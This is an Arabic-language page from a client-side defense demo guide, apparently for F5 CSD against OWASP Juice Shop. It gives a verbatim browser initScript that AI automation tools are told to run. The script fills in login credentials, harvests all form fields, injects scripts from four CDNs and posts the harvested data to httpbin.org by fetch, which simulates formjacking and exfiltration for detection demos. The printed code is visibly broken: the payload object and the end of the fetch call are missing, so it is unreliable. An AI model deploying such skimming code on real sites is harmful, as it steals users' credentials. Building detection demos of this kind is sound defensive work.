## كشف المشغلات

يراقب CSD سلوك JavaScript داخل المتصفح. بخلاف WAF أو Bot Defense، لا يمكنك تشغيل كشف CSD باستخدام أوامر curl — فهو يتطلب نشاط سكريبت حقيقي على جانب المتصفح. يشغل السكريبت المدمج التالي جميع إشارات كشف CSD الثلاث في تنفيذ واحد: حصاد حقول النماذج، حقن سكريبتات الطرف الثالث من عدة مجالات CDN، وتسرب البيانات إلى نقاط نهاية خارجية.

### التنفيذ الآلي بواسطة الذكاء الاصطناعي

يقوم مساعدو الذكاء الاصطناعي بأدوات أتمتة المتصفح (MCP Chrome DevTools, Playwright, Puppeteer) بتنفيذ المحاكاة برمجياً بدلاً من اتباع الخطوات اليدوية أعلاه:

1. **التنقل مع initScript** — انتقل أولاً إلى `about:blank` للتأكد من سياق المستند نظيف، ثم `navigate_page` إلى عنوان URL صفحة تسجيل الدخول (على سبيل المثال، `http://$F5XC_DOMAINNAME/#/login`) مع `initScript` يحفظ native `setInterval`, `clearInterval`, `fetch`, و `console.log` قبل أن تصلحها zone.js، واستطلاع حقول نموذج تسجيل الدخول، وملء بيانات الاعتماد عبر setter `HTMLInputElement.prototype.value` الأصلي، وتنفيذ سكريبت الكشف المدمج مباشرة. استخدم initScript الحرفي أدناه.
2. **إغلاق لافتة الترحيب** — `press_key` مع `Escape` لإغلاق لافتة الترحيب. في الزيارات اللاحقة قد لا تظهر اللافتة (تم حفظ ملفات تعريف الارتباط)
3. **انتظر الإكمال** — انتظر 10 ثوان لإكمال جميع استدعاءات رد الاتصال لتحميل/خطأ CDN وحل وعود fetch
4. **التقط الأدلة** — `list_console_messages` للتحقق من `[CSD Demo] Simulation complete`؛ `list_network_requests` المفلترة لأنواع `script` و `fetch` للتحقق من رموز حالة HTTP

**صيغة initScript (حرفياً — يلف سكريبت الكشف المدمج للتنفيذ الآلي):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('input[type="email"]');
  var passEl  = document.querySelector('input[type="password"]');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()

      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
```

**ملاحظة بشأن `fetch` الأصلي:** يحفظ هذا الحزام `window.fetch.bind(window)` لتجنب أخطاء zone.js. هذا هو السلوك الصحيح لجميع مراحل محاكاة الهجوم. تحظر تخفيفات CSD تحميل السكريبت (بمسح قيم `src` لعلامة `<script>`)، وليس استدعاءات `fetch()`، لذا فإن حفظ مرجع fetch الأصلي لا يؤثر على سلوك التخفيف. يتم استخدام نفس initScript للمرحلة 2 والمرحلة 3.

<Aside type="caution">
**عدم التوافق مع zone.js** — يستخدم Juice Shop zone.js الخاص بـ Angular، والذي يصلح `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest`، وواجهات برمجة تطبيقات المتصفح الأخرى. هذا يكسر أدوات MCP `evaluate_script`, `fill`، و `click` مع `Cannot read properties of undefined (reading 'call')`. استخدم `navigate_page` مع `initScript` بدلاً من ذلك — يتم تشغيل `initScript` قبل تحميل zone.js، لذا يمكنك حفظ مراجع API الأصلية. يجب أن يملأ initScript حقول النموذج باستخدام setter `HTMLInputElement.prototype.value` الأصلي (وليس أداة `fill`) وتشغيل سكريبت الكشف مباشرة داخل رد استدعاء `setInterval`.
</Aside>

<Aside type="note">
**تراكم initScript** — كل استدعاء `navigate_page` مع معامل `initScript` يضيف السكريبت إلى قائمة دائمة تعمل على كل تحميل مستند لاحق في سياق المتصفح هذا. لتجنب تداخل السكريبتات القديمة، انتقل إلى `about:blank` بين التشغيلات أو استخدم `new_page` مع `isolatedContext` للحصول على سياق نظيف.
</Aside>

يستخدم المشغلون بدون أدوات أتمتة المتصفح الخطوات اليدوية أعلاه.

<Aside type="tip">
يستغرق الكشف **5-10 دقائق** للظهور على لوحة تحكم CSD. إذا لم تكن التنبيهات مرئية بعد تشغيل السكريبت، فتابع مع [شرح وحدة تحكم CSD](/csd/csd-console/) وتحقق مرة أخرى.
</Aside>

### ما يفعله السكريبت

يشغل المحاكاة المدمجة جميع إشارات كشف CSD الثلاث:

| السلوك | ما يفعله السكريبت | ما يراه CSD |
| --- | --- | --- |
| **حصاد الحقول** | قراءة القيم من عناصر `input` الموجودة (البريد الإلكتروني، كلمة المرور) | السكريبتات التي تقرأ حقول النموذج الحساسة — تم وضع علامة عليها مخاطرة عالية |
| **حقن السكريبت** | إلحاق 4 علامات `<script>` تحمل من `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`، و `ga.jspm.io` | 4 مجالات سكريبت طرف ثالث جديدة على الصفحة |
| **تسرب البيانات** | إرسال البيانات المحصودة عبر `fetch` إلى `www.httpbin.org` و `jsonplaceholder.typicode.com` | استدعاءات الشبكة إلى مجالات خارجية (ملاحظة: وجهات fetch تظهر كتفاعلات شبكة السكريبت، وليس في عرض مجال الشبكة) |

<Aside type="note">
لدى CSD حدود كشف محددة — على سبيل المثال، يتم تتبع حقول DOM لتحميل الصفحة فقط وعرض الشبكة يُظهر مجالات تحميل السكريبت فقط. راجع [حدود الكشف](/csd/overview/#detection-boundaries) للقائمة الكاملة.
</Aside>

### محاكاات متقدمة

السكريبت المدمج أعلاه هو إصدار مبسط ثلاثي المراحل (حصاد، حقن، تسرب) مناسب لمعظم العروض التوضيحية. توفر [مكتبة سكريبتات الهجوم](/csd/attack-scripts/) 10 سكريبتات موجهة منظمة حسب نوع الهجوم، بما في ذلك اختبار ضغط **الكشف الأقصى** الذي يضيف معالجة DOM وتسرب ملفات تعريف الارتباط وقنوات إشارات الصور على رأس تغطية السكريبت المدمج. استخدم السكريبتات الفردية لعرض فئات هجوم محددة (formjacking، digital skimming، حقن سلسلة التوريد، تسرب البيانات، معالجة DOM) بشكل منفصل.
